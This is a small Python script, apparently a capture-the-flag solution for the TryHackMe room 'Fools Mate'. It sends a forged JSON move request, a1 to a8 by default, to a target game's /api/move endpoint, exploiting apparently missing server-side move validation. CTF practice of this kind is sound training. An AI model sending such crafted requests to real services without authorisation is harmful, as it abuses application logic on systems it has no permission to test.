import argparse
from datetime import datetime
import requests

AUTHOR = "cyber30"
ROOM = "Fools Mate TryHackMe"
DATE = datetime.now().strftime("%Y-%m-%d")
DATE_CREATED = "2026-07-05"

def print_banner():
    banner = f"""
======================================================================================

   █████████  █████ █████ ███████████  ██████████ ███████████    ████████     █████   
  ███░░░░░███░░███ ░░███ ░░███░░░░░███░░███░░░░░█░░███░░░░░███  ███░░░░███  ███░░░███ 
 ███     ░░░  ░░███ ███   ░███    ░███ ░███  █ ░  ░███    ░███ ░░░    ░███ ███   ░░███
░███           ░░█████    ░██████████  ░██████    ░██████████     ██████░ ░███    ░███
░███            ░░███     ░███░░░░░███ ░███░░█    ░███░░░░░███   ░░░░░░███░███    ░███
░░███     ███    ░███     ░███    ░███ ░███ ░   █ ░███    ░███  ███   ░███░░███   ███ 
 ░░█████████     █████    ███████████  ██████████ █████   █████░░████████  ░░░█████░  
  ░░░░░░░░░     ░░░░░    ░░░░░░░░░░░  ░░░░░░░░░░ ░░░░░   ░░░░░  ░░░░░░░░     ░░░░░░   
                                                                                      
                                                                                                                              
    [+] Target Mover API Tool
    [+] Author: {AUTHOR}
    [+] Room: {ROOM}
    [+] Date Created:   {DATE_CREATED}
    [+] Date:   {DATE}
======================================================================================
"""
    print(banner)


def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Send an API move request to a target host."
    )
    
    parser.add_argument(
        "ip", help="Target IP address or hostname (e.g., 10.130.186.221)"
    )
    parser.add_argument(
        "--from-pos",
        default="a1",
        help="Starting position (default: a1)",
        dest="from_pos",
    )
    parser.add_argument(
        "--to-pos", default="a8", help="Ending position (default: a8)", dest="to_pos"
    )

    args = parser.parse_args()

    
    target_ip = args.ip
    if not target_ip.startswith(("http://", "https://")):
        url = f"http://{target_ip}/api/move"
    else:
        url = (
            f"{target_ip}/api/move"
            if target_ip.endswith("/")
            else f"{target_ip}/api/move"
        )

    
    payload = {"from": args.from_pos, "to": args.to_pos}

    headers = {"Content-Type": "application/json"}

    
    print(f"[*] Sending request to {url}...")
    print(f"[*] Payload: {payload}\n")

    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"[+] Status Code: {response.status_code}")
        print("[+] Response Body:")
        print(response.text)

    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred: {e}")


if __name__ == "__main__":
    main()
